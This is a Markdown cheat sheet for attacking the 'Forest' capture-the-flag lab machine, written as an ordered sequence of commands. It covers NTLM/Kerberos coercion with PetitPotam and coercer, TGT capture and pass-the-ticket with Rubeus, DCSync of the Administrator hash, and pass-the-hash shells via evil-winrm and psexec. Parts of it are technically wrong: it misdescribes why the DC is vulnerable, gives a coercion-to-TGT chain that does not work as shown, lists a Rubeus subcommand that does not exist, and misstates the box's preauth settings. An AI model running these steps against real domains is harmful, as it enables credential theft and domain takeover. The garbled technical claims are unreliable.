# Forest-Specific Knowledge Checklist

## 🎯 The ONE Thing This Machine Teaches

**Unconstrained Delegation on a Domain Controller = Game Over**

Everything else is noise. Focus here.

---

## 📋 Minimum Viable Knowledge (Must Know Cold)

### 1. What `userAccountControl: 532480` Means
```bash
# Decode it
python3 -c "
val = 532480
flags = {
    524288: 'TRUSTED_FOR_DELEGATION (UNCONSTRAINED)  ← THE BUG',
    8192: 'TRUSTED_TO_AUTH_FOR_DELEGATION (constrained/protocol transition)',
}
for k,v in flags.items():
    if val & k: print(f'  ✓ {k} = {v}')
"
# Output: 524288 (UNCONSTRAINED) + 8192 = 532480
```

**Why it matters:** FOREST$ (the DC) can request tickets **as any user** to **any service**. Every Domain Admin who logs in → their TGT cached in DC's LSASS.

### 2. The Attack Chain (Memorize This Flow)
```
PetitPotam/Printer Bug  →  DC authenticates to attacker via Kerberos
                                    ↓
                            Attacker captures DC's TGT (AP-REQ)
                                    ↓
                            Rubeus extracts TGT → Pass-The-Ticket
                                    ↓
                            DCSync as DC → Dump Administrator hash
                                    ↓
                            Pass-The-Hash → SYSTEM on DC → root.txt
```

### 3. Coercion Techniques (Know Both)
| Technique | Protocol | Tool | Command |
|-----------|----------|------|---------|
| **PetitPotam** | MS-EFSRPC (EFS) | coercer | `python3 coercer.py coerce -t 10.129.95.210 -l <YOUR_IP> -u '' -p '' --method efsrpc` |
| **Printer Bug** | MS-RPRN (Spooler) | SpoolSample / Rubeus | `Rubeus.exe monitor /interval:5` + `SpoolSample.exe 10.129.95.210 <YOUR_IP>` |

**Critical:** Both work **anonymously** on Server 2016 (no patch).

### 4. Rubeus Commands (Windows Required)
```powershell
# 1. Monitor for incoming TGTs (run FIRST)
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# 2. After coercion, you'll see base64 ticket → Pass-The-Ticket
Rubeus.exe ptt /ticket:<base64_from_monitor>

# 3. DCSync with DC's context
Rubeus.exe dcsync /user:htb\Administrator /domain:htb.local /dc:FOREST.htb.local

# Alternative: Get hash, use with Impacket on Linux
# secretsdump.py -just-dc-user Administrator -just-dc-ntlm "htb.local/FOREST$@10.129.95.210" -no-pass
```

### 5. Impacket DCSync (Linux Alternative)
```bash
# If you have DC's NTLM (from relay) or TGT (converted to ccache)
# Option A: With NTLM hash
secretsdump.py -just-dc-user Administrator "htb.local/FOREST\$@10.129.95.210" -hashes :<DC_NTLM>

# Option B: With Kerberos TGT (kirbi → ccache)
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass htb.local/FOREST\$@FOREST.htb.local -just-dc-user Administrator
```

---

## 🔧 Exact Commands to Run (In Order)

### Phase 1: Verify the Vulnerability (2 min)
```bash
# 1. Confirm FOREST$ has unconstrained delegation
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(sAMAccountName=FOREST\$)" \
  userAccountControl servicePrincipalName -o ldif-wrap=no
# Look for: userAccountControl: 532480

# 2. Quick nxc check
nxc ldap 10.129.95.210 -u '' -p '' --computers | grep -i unconstrained
```

### Phase 2: Coerce (Pick ONE)

**Option A: Coercer (Easiest, Linux)**
```bash
cd ~/tools/coercer
python3 coercer.py coerce -t 10.129.95.210 -l <YOUR_TUN0_IP> -u '' -p '' --method efsrpc
# Wait for "Authentication received" → check Rubeus monitor
```

**Option B: PetitPotam Direct**
```bash
cd ~/tools/PetitPotam
python3 PetitPotam.py -d htb.local -u '' -p '' 10.129.95.210 <YOUR_TUN0_IP>
```

### Phase 3: Capture TGT (Windows Box Needed)
```powershell
# On your Windows VM / attack box:
# 1. Start monitor BEFORE coercion
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# 2. Run coercion from Linux (above)

# 3. When ticket appears, copy base64, then:
Rubeus.exe ptt /ticket:<BASE64_TICKET>

# 4. DCSync
Rubeus.exe dcsync /user:htb\Administrator /domain:htb.local /dc:FOREST.htb.local
```

### Phase 4: Get Flags
```powershell
# With Administrator hash from DCSync:
# Option A: evil-winrm
evil-winrm -i 10.129.95.210 -u Administrator -H <NTLM_HASH>
# cat C:\Users\Administrator\Desktop\root.txt

# Option B: psexec.py (from Linux)
psexec.py htb.local/Administrator@10.129.95.210 -hashes :<NTLM_HASH>
# type C:\Users\Administrator\Desktop\root.txt
```

---

## 🚫 What NOT to Waste Time On

| Vector | Why Skip |
|--------|----------|
| Kerberoasting | Only machine accounts have SPNs (FOREST$, EXCH01$) |
| AS-REP Roasting | No users with `DONT_REQUIRE_PREAUTH` |
| Password Spraying | Lockout policy, no weak passwords found |
| SMB Null Shares | Access denied on all shares |
| Certificate Attacks (ESC1-13) | Possible but overkill; delegation is faster |
| RBCD on svc-alfresco | Possible but delegation path is direct |

---

## 🎯 If Coercion Fails - Troubleshooting

| Issue | Fix |
|-------|-----|
| "Access denied" on EFSRPC | Target patched? Try Printer Bug instead |
| No TGT in Rubeus monitor | Run monitor **before** coercion; check filteruser=FOREST$ |
| DC connects via NTLM not Kerberos | Force Kerberos: use FQDN `FOREST.htb.local` not IP |
| SMB signing blocks relay | Forest requires signing → use **Kerberos** coercion (not NTLM relay) |
| Rubeus "ticket not valid" | Ensure clock sync: `ntpdate 10.129.95.210` on attacker |

---

## 📝 Minimal Notes Template for This Box

```markdown
# Forest - Attack Log

## Target
- IP: 10.129.95.210
- Domain: htb.local
- DC: FOREST.htb.local

## Vuln Confirmed
- [ ] FOREST$ userAccountControl: 532480 (unconstrained delegation)

## Coercion
- Method: PetitPotam / Printer Bug
- Attacker IP: <tun0>
- Result: [Success/Failed - why?]

## TGT Capture
- Tool: Rubeus monitor
- Ticket obtained: [Y/N]
- PTT success: [Y/N]

## DCSync
- Administrator NTLM: <hash>
- krbtgt NTLM: <hash> (for Golden Ticket)

## Flags
- user.txt: (if low-priv shell first)
- root.txt: <hash>
```

---

## 🏆 Success = You Can Explain

1. **Why** unconstrained delegation on DC is critical
2. **How** PetitPotam forces DC to authenticate
3. **What** Rubeus captures (AP-REQ with TGT)
4. **Why** DCSync works with DC's TGT (DRsuAPI replication rights)
5. **Mitigations**: "Account is sensitive...", Protected Users, delegation monitoring

---

## ⚡ One-Liner Summary

> **Forest = Unconstrained DC → PetitPotam → Rubeus TGT → DCSync → DA**

Everything else is distraction. Master this chain.